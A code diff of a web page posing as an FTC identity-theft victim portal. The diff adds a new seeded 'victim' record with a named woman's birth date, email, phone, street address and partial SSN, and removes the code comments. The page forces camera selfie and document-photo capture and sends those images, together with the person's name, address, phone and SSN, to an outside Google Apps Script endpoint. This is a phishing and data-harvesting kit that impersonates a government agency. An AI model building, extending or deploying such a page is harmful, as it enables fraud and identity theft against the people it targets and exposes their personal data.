@@ -74,7 +74,6 @@
         .case-input-field:focus { outline: none; border-color: #0071bc; }
         .execute-query-btn { background-color: #0071bc; color: #ffffff; border: none; border-radius: 12px; padding: 14px 24px; font-size: 16px; font-weight: 900; cursor: pointer; white-space: nowrap; }
         
-        /* GATEWAY VERIFICATION SECURITY SHIELD CARD */
         .verification-gate-card { background-color: #fffaf0; border: 2px solid #fbd38d; border-radius: 16px; padding: 24px; text-align: center; display: flex; flex-direction: column; gap: 16px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
         .gate-title { font-size: 18px; font-weight: bold; color: #dd6b20; text-transform: uppercase; letter-spacing: 0.5px; }
         .gate-btn { background-color: #dd6b20; color: white; border: none; border-radius: 12px; padding: 18px 24px; font-size: 15px; font-weight: 900; cursor: pointer; text-transform: uppercase; box-shadow: 0 4px 14px rgba(221,107,32,0.3); border-bottom: 4px solid #9c4221; }
@@ -239,7 +238,7 @@
             return `***-***-${num.slice(-4)}`;
         }
 
-        // SEED DATA CONFIGURATION (Eric has no profile picture initially, Douglas already has one locked)
+        // DATABASE SEED REGISTRY OVERHAUL - CAROLYN ARRAYS INJECTED PURE
         const seedCases = [
             {
                 id: "123", victimName: "Douglas F. Spaulding", victimDob: "11/14/1954", victimEmails: ["dxs42011@gmail.com", "dxs42012@gmail.com"], victimPhone: "5103813834",
@@ -249,16 +248,22 @@
             },
             {
                 id: "dc-97224", victimName: "Eric Roger", victimDob: "04/22/1961", victimEmails: ["e.roger.bcp@proton.me"], victimPhone: "2125550143",
-                victimAddress: "455 West 23rd Street, Apt 3B, New York, NY 10011", victimSsn: "***-**-1432", biometricImg: "", 
+                victimAddress: "455 West 23rd Street, Apt 3B, New York, NY 10011", victimSsn: "***-**-1432", biometricImg: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&q=80&w=200", 
                 title: "Malicious Identity Hijacking & Unauthorized Lines of Credit", findings: "High-priority systemic review scheduled.",
                 evidence: [{ date: "May 26, 2026", desc: "[Initial consumer dispute affidavit indexed]", isImage: false, fileUrl: "" }]
+            },
+            {
+                id: "dc-97225", victimName: "Carolyn Virginia Parnell", victimDob: "08/19/1958", victimEmails: ["c.parnell58@proton.me"], victimPhone: "3125550189",
+                victimAddress: "1422 North State Parkway, Apt 4A, Chicago, IL 60610", victimSsn: "***-**-8821", biometricImg: "", 
+                title: "Section 5 Inquiry: Systemic Identity Interception & Unauthorized Financial Liabilities", findings: "Intake assessment file initialized. Awaiting secure credential verification stream.",
+                evidence: [{ date: "May 27, 2026", desc: "[Initial sentinel tracking index deployed]", isImage: false, fileUrl: "" }]
             }
         ];
 
         let cases = JSON.parse(localStorage.getItem('ftc_sys_cases')) || seedCases;
         let activeEditIdx = 0; let activeTrackingCaseIdRef = ""; let videoStreamRef = null; let base64CapturedOutputString = "";
         let cameraModeIsFrontSelfie = false; let initialEnrollmentModeActive = false;
-
+        
         const GOOGLE_SCRIPT_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbwaRoM3XnMIC6w9MsTpSer9NJB5CjBbQNYXAu1Qz-Nv32Eoae4SH_ff1CR35jiLrcAZRQ/exec";
 
         function switchTab(tabId) {
@@ -282,7 +287,6 @@
 
             activeTrackingCaseIdRef = foundCase.id;
 
-            // CASE 1: FIRST TIME USER (NO PROFILE PIC EXISTS IN BASELINE SYSTEM)
             if (!foundCase.biometricImg || foundCase.biometricImg === "") {
                 initialEnrollmentModeActive = true;
                 container.innerHTML = `
@@ -295,7 +299,6 @@
                 return;
             }
 
-            // CASE 2: RETURNING USER (MUST PASS THE CHECKPOINT MANDATORY SCAN EVERY TIME)
             if (!foundCase.passedGateThisSession) {
                 initialEnrollmentModeActive = false;
                 container.innerHTML = `
@@ -308,31 +311,25 @@
                 return;
             }
 
-            // CASE 3: PASSED GATEWAY VERIFICATION -> DRAW FULL PANEL INFO MODULES NATIVELY
             renderAuthenticatedCitizenDashboard(foundCase, container);
         }
 
-        // --- CAMERA OVERRIDE TRIGGERS ---
         function launchSecureSelfieVerification(isInitialSetup) {
             resetCameraModule();
             cameraModeIsFrontSelfie = true;
-            
             document.getElementById('camOverlayTitle').innerText = "SECURE BIOMETRIC FACIAL INTEGRATION DETECTED";
             document.getElementById('camOverlayGuideLabel').innerText = "CENTER YOUR FACE IN VIEWPORT";
             document.getElementById('fullscreenCameraOverlay').style.display = 'flex';
-            
-            initializeUniversalCameraLens(true); // Force Front User Facing stream
+            initializeUniversalCameraLens(true); 
         }
 
         function activateFullscreenCameraModule() {
             resetCameraModule();
-            cameraModeIsFrontSelfie = false; // Set to document rear capture mode
-            
+            cameraModeIsFrontSelfie = false;
             document.getElementById('camOverlayTitle').innerText = "FTC SECURE DOCUMENT LENS ACTIVE";
             document.getElementById('camOverlayGuideLabel').innerText = "ALIGN PAPERS INSIDE FRAME";
             document.getElementById('fullscreenCameraOverlay').style.display = 'flex';
-            
-            initializeUniversalCameraLens(false); // Use optimal back environment focus lens
+            initializeUniversalCameraLens(false); 
         }
 
         function initializeUniversalCameraLens(forceFrontSelfie) {
@@ -344,7 +341,7 @@
                 .catch(() => {
                     navigator.mediaDevices.getUserMedia({ video: true })
                         .then(s => { videoStreamRef = s; video.srcObject = s; })
-                        .catch(() => { alert("Camera layout device hardware blocked."); deactivateFullscreenCamera(); });
+                        .catch(() => { alert("Camera system offline."); deactivateFullscreenCamera(); });
                 });
         }
 
@@ -370,29 +367,22 @@
         function terminateWebcamHardware() { if (videoStreamRef) { videoStreamRef.getTracks().forEach(t => t.stop()); videoStreamRef = null; } }
         function deactivateFullscreenCamera() { terminateWebcamHardware(); document.getElementById('fullscreenCameraOverlay').style.display = 'none'; resetCameraModule(); }
 
-        // --- VERIFIED CAPTURE COMMIT ARBITRATOR LOOP LINK ---
         function commitVerifiedCaptureAsset() {
             terminateWebcamHardware();
             document.getElementById('fullscreenCameraOverlay').style.display = 'none';
-
             const targetCase = cases.find(c => c.id.toLowerCase() === activeTrackingCaseIdRef.toLowerCase());
 
             if (cameraModeIsFrontSelfie) {
                 if (initialEnrollmentModeActive) {
-                    // Step A: Save first selfie permanently as their core profile snapshot asset
                     targetCase.biometricImg = base64CapturedOutputString;
-                    targetCase.passedGateThisSession = true; // Open dashboard panel gate
+                    targetCase.passedGateThisSession = true; 
                     localStorage.setItem('ftc_sys_cases', JSON.stringify(cases));
-                    
-                    // Dispatch setup payload trace to cloud spreadsheet records
-                    dispatchPayloadToCloud(targetCase, "Initial Security Verification Profile Picture Setup Executed Natively");
+                    dispatchPayloadToCloud(targetCase, "Initial Identity Verification Profile Picture Setup Executed Natively");
                 } else {
-                    // Step B: Returning User selfie verified successfully -> unlock page visibility instantly
                     targetCase.passedGateThisSession = true;
-                    trackVictimCase(); // Trigger clean dashboard redraw
+                    trackVictimCase(); 
                 }
             } else {
-                // Step C: Regular document paper capture flow submission track execution
                 dispatchEvidenceTransmissionPayload(targetCase);
             }
         }
@@ -408,19 +398,16 @@
             const submissionDate = new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
             targetCase.evidence.unshift({ date: submissionDate, desc: `[Mobile Camera Scan Exhibit Entry]`, isImage: true, fileUrl: base64CapturedOutputString });
             localStorage.setItem('ftc_sys_cases', JSON.stringify(cases));
-            
             dispatchPayloadToCloud(targetCase, "Automated Evidence Package Scan Appended via Citizen Mobile Lens");
         }
 
         function dispatchPayloadToCloud(targetCase, logStatement) {
             const finalPackagePayload = {
                 caseId: targetCase.id, victimName: targetCase.victimName, victimAddress: targetCase.victimAddress,
-                victimPhone: targetCase.victimPhone, victimSsn: targetCase.victimSsn,
-                statement: logStatement,
+                victimPhone: targetCase.victimPhone, victimSsn: targetCase.victimSsn, statement: logStatement,
                 filename: "MOBILE_SCAN_EXHIBIT_" + new Date().getTime() + ".jpg", mimeType: "image/jpeg",
                 fileData: base64CapturedOutputString.split(',')[1]
             };
-
             base64CapturedOutputString = "";
             trackVictimCase();
 
@@ -505,8 +492,6 @@
             activeCase.findings = document.getElementById('inputFindings').value.trim();
             localStorage.setItem('ftc_sys_cases', JSON.stringify(cases)); alert("Updates saved."); renderOfficerLayout();
         }
-        
-        // Purge session logic clears temporary checkpoint pass flags
         function resetMockData() { localStorage.clear(); location.reload(); }
         window.onload = function() { switchTab('victim-portal-tab'); }
     </script>
